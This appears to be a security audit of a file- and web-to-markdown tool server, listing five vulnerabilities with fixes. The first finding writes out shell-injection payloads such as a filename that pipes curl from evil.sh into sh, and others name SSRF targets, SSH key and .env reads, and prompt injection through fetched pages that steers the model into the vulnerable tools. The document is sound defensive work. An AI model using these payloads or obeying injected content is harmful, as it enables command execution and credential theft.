title: Tool filepath / uvPath / projectRoot pasted into a shell command via exec()
reason: filepath from any *-to-markdown tool goes inside double quotes in a string run by child_process.exec (a shell), so filepath `x"; curl evil.sh | sh; "` or `$(id)` runs commands; the hidden-but-accepted uvPath argument is even the program itself, and projectRoot is pasted unquoted.
fix: Use execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell; drop uvPath and projectRoot from the request schema and take them only from operator config/env.

title: URL tools only block literal private IPs; hostnames and redirects reach internal services
reason: is_ip_private only inspects the literal hostname string, so `http://localhost/`, a DNS name resolving to 127.0.0.1 / 169.254.169.254, or a public URL that redirects to an internal one is fetched (fetch follows redirects) and its body is returned to the model.
fix: Resolve the hostname with dns.lookup (all addresses) and reject private/loopback/link-local/IPv6-local ranges, fetch with redirect: 'manual' and re-check each hop, and pin the connection to the checked IP.

title: File-conversion tools read any file path with no root restriction
reason: pdf/image/audio/docx/xlsx/pptx-to-markdown accept any absolute path and markitdown converts plain-text files too, so `~/.ssh/id_rsa`, `.env` or cloud credential files are returned to the model.
fix: Resolve the path with fs.realpathSync, require it to be inside a configured allowed directory (path.relative not starting with '..'), and check the extension matches the tool.

title: get-markdown-file: optional prefix check without separator, on a different path than the one read
reason: The containment check only runs when MD_SHARE_DIR is set, uses startsWith without a trailing separator (`/share` also allows `/share-evil/x.md`), checks the unresolved path (symlinks inside the share dir escape it) and then reads the raw filePath; reads are limited to .md/.markdown names.
fix: Make MD_SHARE_DIR mandatory, realpath both paths, require path.relative(root, real) not to start with '..', and read the checked real path.

title: Fetched web pages / documents returned raw into the model context
reason: Webpage, Bing, YouTube and document content goes straight into the model context unmarked; injected text there can steer the model into calling the command-injectable file tools.
fix: Wrap returned content in clearly marked untrusted-data delimiters and tell clients to treat it as data; fixing M001 removes the most dangerous follow-on.
